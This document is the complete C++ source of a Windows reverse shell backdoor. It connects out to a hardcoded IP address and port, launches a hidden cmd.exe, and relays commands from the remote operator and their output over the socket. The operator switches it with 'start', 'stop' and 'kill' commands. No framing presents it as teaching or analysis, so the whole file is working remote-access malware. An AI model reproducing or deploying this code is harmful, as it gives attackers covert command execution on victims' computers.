#include <winsock2.h>
#include <windows.h>
#include <string>
#include <thread>
#include <iostream>
#include <ShObjIdl.h>

#pragma comment(lib,"ws2_32.lib")

using namespace std;

SOCKET skt;
HANDLE pipeInWrite;

static std::string HOST = "1.1.1.1";
static int PORT = 9999;

bool connected = false;
bool active = false;

static DWORD WINAPI HandlePipeOut(LPVOID lpParam) {
	char buffer[4096];
	DWORD bytesRead = 0;
	while (connected) {
		if (active) {
			memset(buffer, 0, sizeof(buffer));
			PeekNamedPipe(pipeInWrite, NULL, NULL, NULL, &bytesRead, NULL);
			if (bytesRead) {
				if (!ReadFile(pipeInWrite, buffer, sizeof(buffer), &bytesRead, NULL)) {

				}
				else {
					send(skt, buffer, bytesRead, 0);
				}
			}
		}
		Sleep(1);
	}
	return 1;
}

int main(char* argv, int argc) {
	SECURITY_ATTRIBUTES securityAttributes;
	securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.lpSecurityDescriptor = NULL;

	HANDLE pipeOutRead, pipeInRead, pipeOutWrite;
	CreatePipe(&pipeInWrite, &pipeInRead, &securityAttributes, 0);
	CreatePipe(&pipeOutWrite, &pipeOutRead, &securityAttributes, 0);

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(STARTUPINFO);
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.hStdInput = pipeOutWrite;
	startupInfo.hStdOutput = pipeInRead;
	startupInfo.hStdError = pipeInRead;
	
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return 0;
	}

	skt = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	struct hostent *host;
	host = gethostbyname(HOST);

	SOCKADDR_IN sockAddr;
	sockAddr.sin_port = htons(PORT);
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

	if (connect(skt, (SOCKADDR*)(&sockAddr), sizeof(sockAddr)) != 0) {
		return 0;
	}

	connected = true;	

	PROCESS_INFORMATION processInfo = { 0 };
	char cmdPath[300];
	GetEnvironmentVariableA("ComSpec", cmdPath, sizeof(cmdPath));
	CreateProcessA(NULL, cmdPath, &securityAttributes, &securityAttributes, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

	DWORD dwThreadReceiveID;
	CreateThread(NULL, 0, HandlePipeOut, 0, 0, &dwThreadReceiveID);

	while (connected) {
		int bufferLength = 4096;
		char buffer[4096];
		int iResult;

		iResult = recv(skt, buffer, bufferLength, 0);

		if (iResult > 0) {
			std::string cmd = string(buffer, buffer + iResult);
			if (active && cmd[0] == '0') {
				cmd = cmd.substr(1);
				DWORD bytesWrote;
				WriteFile(pipeOutRead, cmd.c_str(), strlen(cmd.c_str()), &bytesWrote, NULL);
			}
			else {
				cmd = cmd.substr(1);
				if (cmd == "start") {
					active = true;			
				}
				else if (cmd == "stop") {
					active = false;
				}
				else if (cmd == "kill") {
					active = false;
					connected = false;
				}
			}
		}
		else {
			connected = false;
			active = false;
		}
		
		Sleep(1);
	}

	while (!TerminateProcess(processInfo.hProcess, 0)) {
		Sleep(1000);
	}
	
	closesocket(skt);
	WSACleanup();

	return 0;
}
